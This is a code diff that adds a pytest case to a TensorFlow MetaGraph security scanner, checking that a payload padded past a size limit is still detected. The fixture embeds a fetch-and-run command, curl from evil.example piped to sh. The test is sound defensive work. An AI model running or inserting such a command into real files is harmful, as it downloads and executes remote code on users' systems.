@@ -197,6 +197,24 @@ def test_tf_metagraph_scanner_detects_unsafe_ops_and_executable_payload_signals(
     )
 
 
+def test_tf_metagraph_scanner_inspects_collection_payload_through_collection_limit(tmp_path: Path) -> None:
+    malicious_meta = tmp_path / "late-collection-payload.meta"
+    malicious_meta.write_bytes(
+        _build_metagraph(
+            graph_nodes=[{"name": "const", "op": "Const"}],
+            collection_bytes={
+                "runtime_hook": [
+                    (b"x" * (_MAX_ATTR_VALUE_BYTES + 1)) + b" python -c 'curl https://evil.example/late | sh'"
+                ]
+            },
+        )
+    )
+
+    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))
+
+    assert any(check.name == "MetaGraph Collection Executable Pattern" for check in result.checks)
+
+
 @pytest.mark.parametrize("op_name", ["LoadLibrary", "LoadLibraryV2"])
 def test_tf_metagraph_scanner_flags_loadlibrary_ops_without_path_attributes(tmp_path: Path, op_name: str) -> None:
     loadlibrary_meta = tmp_path / f"{op_name.lower()}.meta"
